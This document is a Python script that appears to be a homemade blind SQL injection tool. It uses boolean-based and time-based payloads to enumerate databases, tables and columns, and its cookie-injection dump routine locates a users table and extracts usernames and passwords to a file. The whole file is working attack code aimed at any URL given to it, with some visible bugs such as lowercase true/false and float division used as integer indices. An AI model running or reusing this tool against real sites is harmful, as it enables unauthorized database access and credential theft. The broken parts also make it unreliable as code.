from optparse import OptionParser
import sys
import requests
import hashlib
import string
import requests
import logging
import argparse
import sys
from time import sleep
from binascii import hexlify
import re
from urllib import parse
import time



chars=string.ascii_uppercase + string.digits

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"

def http_get(url):
    result = s.get(url)
    return result.content

def check_injectionBool(url):
    hash_url = md5(http_get(url))
    test_query = 'and 1=1 --'
    new_url = url + test_query
    hash_new_url = md5(http_get(new_url))
    if hash_url == hash_new_url:
        print("Boolean-based SQL injection was detected")
    else:
        print("There is NO Boolean-based SQLi")



def check_injectionTime(url):
    sleep = 2
    test_query = ' AND (SELECT IF(length("a") = 1,sleep(%s),"Null"))' % sleep
    new_url = url + test_query
    req = requests.get(new_url)
    time = req.elapsed.total_seconds()
    if time > sleep:
        print("Time-based SQL injection was detected")
        return true
    else:
        print("There is NO Time-based SQLi")
        return false

parser=OptionParser()

parser.add_option("-D", "--database", action="store",type="string",dest="database",help="Please input test databases")
parser.add_option("-T", "--table",action="store",type="string",dest="table",help="Please input test table")
parser.add_option("-C", "--column",action="store",type="string",dest="column",help="Please input test column")
parser.add_option("-u","--url", action="store",type="string",dest="url",help="Please input test url")
parser.add_option("-c","--cookie", action="store",type="string",dest="cookie",help="Please input cookie")

(options,args) = parser.parse_args()

def main():
    if options.url == None and options.database == None and options.table == None and options.column == None and options.cookie == None:
        print("Please read the help")
        parser.print_help()
        sys.exit()
    else:
        print("SQLi[B/T]")
        w = input()
        if w=="B":
            if options.url != None and options.database ==None and options.table == None and options.column == None and options.cookie == None:
                check_injectionBool(options.url)
                get_all_databases(options.url)
            elif  options.url != None and options.database !=None and options.table == None and options.column == None and options.cookie == None:
                get_db_all_tables(options.url, options.database)
            elif  options.url != None and options.database !=None and options.table != None and options.column == None and options.cookie == None:
                get_db_tb_all_columns(options.url, options.database, options.table)
            elif options.url != None and options.database == None and options.table == None and options.column == None and options.cookie != None:
                dump(options.url, options.cookie)
        else:
            if options.url != None and options.database ==None and options.table == None and options.column == None and options.cookie == None:
                if check_injectionTime(options.url):
                    get_database(options.url)
                    get_tables_number(options.url)
                    get_tables(options.url)


def get_all_databases(url):
	db_nums_payload = "select count(schema_name) from information_schema.schemata"
	db_numbers = half(url, db_nums_payload)
	print("The total number of databases is: %d"% db_numbers)
	for x in range(db_numbers):
		db_len_payload = "select length(schema_name) from information_schema.schemata limit %d,1" % x
		db_name_numbers = half(url, db_len_payload)

		db_name = ""
		for y in range(1,db_name_numbers+1):
		 	db_name_payload = "ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))" % (x,y)
		 	db_name += chr(half(url,db_name_payload))

		print("The %d database is: %s"% (x+1, db_name))




def get_db_all_tables(url,database):
    tb_nums_payload = "select count(table_name) from information_schema.tables where table_schema = '%s'" % database
    tb_numbers = half(url,tb_nums_payload)
    print("The number of tables in the %s database is: %d"% (database,tb_numbers))

    for x in range(tb_numbers):
        tb_len_payload  = "select length(table_name) from information_schema.tables where table_schema = '%s' limit %d,1" % (database,x)

        tb_name_numbers = half(url,tb_len_payload)
        #print(tb_name_numbers)
        tb_name = ""
        for y in range(1,tb_name_numbers+1):

            tb_name_payload = "ascii(substr((select table_name from information_schema.tables where table_schema = '%s' limit %d,1),%d,1))" % (database,x,y)
            #print(tb_name_payload)
            tb_name += chr(half(url,tb_name_payload))
            #print(tb_name)
            print(database,"The %d table in the database is: %s"% (x+1,tb_name))

def get_db_tb_all_columns(url,database,table):
    co_nums_payload = "select count(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s'" % (database,table)
    co_numbers = half(url,co_nums_payload)
    print("The number of fields in the %s table in the %s database is: %d"% (database,table,co_numbers))
    for x in range(co_numbers):
        co_len_payload  = "select length(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1" % (database,table,x)
        co_name_numbers = half(url,co_len_payload)

        co_name = ""
        for y in range(1,co_name_numbers+1):
            co_name_payload = "ascii(substr((select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1),%d,1))" % (database,table,x,y)
            co_name += chr(half(url,co_name_payload))
            print(database,"in the database",table,"the name of the %d field in the table: %s"% (x+1,co_name))

def md5(str):
    hl = hashlib.md5()
    hl.update(str)
    return hl.hexdigest()

def half(url,payload):
    low = 0
    high = 126
    standard_html = md5(http_get(url))
    #print(standard_html)
    while low <= high:
        mid=(low + high)/2
        mid_num_payload = url + " and (%s) > %d-- " % (payload,mid)
        #print(mid_num_payload)
        mid_html = md5(http_get(mid_num_payload))
        #print(mid_html)
        if mid_html == standard_html:
            low = mid + 1
        else:
            high = mid - 1 
    mid_num = int((low+high+1)/2)
    return mid_num

def dump(url, TrackingId):
    queries = [
        "SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()",
        "SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='{}'",
        "SELECT CONCAT({},'::',{}) FROM {}"
    ]
    value = 102
    upperlimit = 176
    lowerlimit = 31
    operator = ">"

    pattern = "Welcome back"
    query = queries[0]
    row = 0
    charNum = 1
    timeoutDelay = 10
    timehascame = 0
    count = 1
    word = list()
    result = list()
    try:
        r = requests.get(url, timeout=timeoutDelay, allow_redirects=False)
        if r.status_code != 200:
            print(f"[-] An Error occured, HTTP (GET) response status: {r.status_code}")
            exit(1)
        filename = f"sqli-dumped-data_{parse.urlsplit(url)[1]}_.txt"
        now = time.localtime()
        start = time.time()
        with open(filename, "w") as f:
            f.write(f"[i] Started in: {time.strftime('%Y/%m/%d %H:%M:%S', now)}\n-----------------------------------\n")
            print(f"[i] Log file created: {filename}")
        print(f"[*] Starting binary search with the query: {query};\n")
        while True:
            payload = f"'AND ASCII(SUBSTRING(({query} LIMIT 1 OFFSET {row}),{charNum},1)) {operator} {value}--"
            cookie = {"TrackingId": TrackingId + payload}
            r = requests.get(url, cookies=cookie, timeout=timeoutDelay, allow_redirects=False)
            count += 1
            if r.status_code == 200:
                if pattern in r.text:
                    lowerlimit = value
                    value = (value+upperlimit)/2
                    if (upperlimit-value) <= 1:
                        operator = "="
                        possibleValue1 = round(upperlimit)
                        possibleValue2 = round(value)
                        value = possibleValue1
                        payload = f"'AND ASCII(SUBSTRING(({query} LIMIT 1 OFFSET {row}),{charNum},1)) {operator} {value}--"
                        cookie = {"TrackingId": TrackingId + payload}
                        r = requests.get(url, cookies=cookie, timeout=timeoutDelay, allow_redirects=False)
                        count += 1
                        if r.status_code == 200 and pattern in r.text:
                            char = chr(value)
                            print(f"[+] {charNum}. character of {row+1}. row has been dumped: {char}")
                            charNum += 1
                            value = 102
                            upperlimit = 176
                            lowerlimit = 31
                            operator = ">"

                        elif r.status_code == 200 and pattern not in r.text:
                            value = possibleValue2
                            payload = f"'AND ASCII(SUBSTRING(({query} LIMIT 1 OFFSET {row}),{charNum},1)) {operator} {value}--"
                            cookie = {"TrackingId": TrackingId + payload}
                            r = requests.get(url, cookies=cookie, timeout=timeoutDelay, allow_redirects=False)
                            count += 1
                            if pattern in r.text:
                                char = chr(value)
                                print(f"[+] {charNum}. character of {row+1}. row has been dumped: {char}")
                                charNum += 1
                                value = 102
                                upperlimit = 176
                                lowerlimit = 31
                                operator = ">"

                            else:
                                print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                                exit(1)
                        else:
                            print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                            exit(1)
                        word.append(char)
                        print(f"[+] Word ==> {''.join(word)}\n")
                elif pattern not in r.text:
                    upperlimit = value
                    value = (lowerlimit+value)/2
                    if (value-31) <= 1:
                        result.append(''.join(word))
                        if result[len(result)-1] == '':
                            timehascame += 1
                            del result[-1]
                            result.append("\n")
                            if "\n\n" in ''.join(result):
                                fileContent = [
                                    query, ";\n",
                                    ''.join(result).split("\n\n")[timehascame-1],
                                    "\n\n",
                                ]
                                with open(filename, "a") as f:
                                    f.writelines(fileContent)
                                    print(f"[*] Dumped data written to: {filename}\n")
                            del result[-1]
                            if timehascame == 1:
                                t = re.compile(".*users*.", re.IGNORECASE)
                                table_name = list(filter(t.search, result))[0]
                                query = queries[1].format(table_name)
                            elif timehascame == 2:
                                u = re.compile(".*username*.", re.IGNORECASE)
                                p = re.compile(".*password*.", re.IGNORECASE)
                                usernameColumn = list(filter(u.search, result))[0]
                                passwordColumn = list(filter(p.search, result))[0]
                                query = queries[2].format(usernameColumn, passwordColumn, table_name)
                            elif timehascame == 3:
                                now = time.localtime()
                                end = time.time()
                                print(f"[*] No more rows is being returned from current query!\n[*] No other query remained!")
                                with open(filename, "a") as f:
                                    f.write(f"------------------------------------\n[i] Finished in: {time.strftime('%Y/%m/%d %H:%M:%S', now)}\n[i] Took {round((end - start)/60)} minutes.\n[i] {count} HTTP requests sent in total.\n[i] {round(count/(end - start),1)} request per second.\n")
                                with open(filename, "r") as f:
                                    print(f"\n\n{filename}\n{''.join('=' for i in range(len(filename)))}\n{f.read()[:-1]}\n\n    Exited!\n")
                                exit()
                            row = -1
                            print(f"[*] No more rows is being returned from current query!\n[*] Continuing with the next query: {query};\n")
                        result.append("\n")
                        print(f"[*] Dumped data so far:\n{''.join(result)}")
                        word.clear()
                        row += 1
                        charNum = 1
                        value = 102
                        upperlimit = 176
                        lowerlimit = 31
                        operator = ">"

            else:
                print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                exit(1)
    except KeyboardInterrupt:
        print("\n\n    Keyboard interrupt, exited!\n")
        exit()
    except Exception as e:
        print(f"\n[-] Program failed because of: {e}\n")

def get_database(url):
    dbname = ""
    database_length = 0
    sleep = 2
    for i in range(200):
        lenquery = ' OR (SELECT IF(length(database()) = %s,sleep(%s),"Null"))' % (i, sleep)
        final_url = url+lenquery
        req = requests.get(final_url)
        time = req.elapsed.total_seconds()
        if time > sleep:
            database_length = i
            break
    for position in range(1, database_length+1):
        for char in chars:
            query = ' AND (SELECT IF(substr(database(),%s,1) like "%s",sleep(%s),"Null"))' % (position, char, sleep)
            final_url = url+query
            req = requests.get(final_url)
            time = req.elapsed.total_seconds()
            if time > sleep:
                dbname += char
                break
            print("The database is %s "% dbname)

def get_tables(url):
    temp_table_name = ""
    for counter in range(0, get_tables_number(url)+1):
        for tchar in range(10):
            for char in chars:
                query = ' AND (SELECT IF(ASCII(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema = database() LIMIT %s,1),%s,1)) LIKE ASCII("%s"),sleep(%s),"Null"))' % (counter, tchar, char, 2)
                final_url = url + query
                req = requests.get(final_url)
                time = req.elapsed.total_seconds()
                if time > 2:
                    temp_table_name += char
        if temp_table_name != "":
            print("The name of a table is %s"% temp_table_name)


def get_tables_number(url):
    sleep = 2
    for digit in range(20):
        query = ' AND (SELECT IF(substr((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database()),1,1) = %s,sleep(%s),"Null"))' % (digit, sleep)
        final_url = url + query
        req = requests.get(final_url)
        time = req.elapsed.total_seconds()
        if time > sleep:
            print("The number of tables is %d" % digit)

if __name__ == '__main__':
    main()
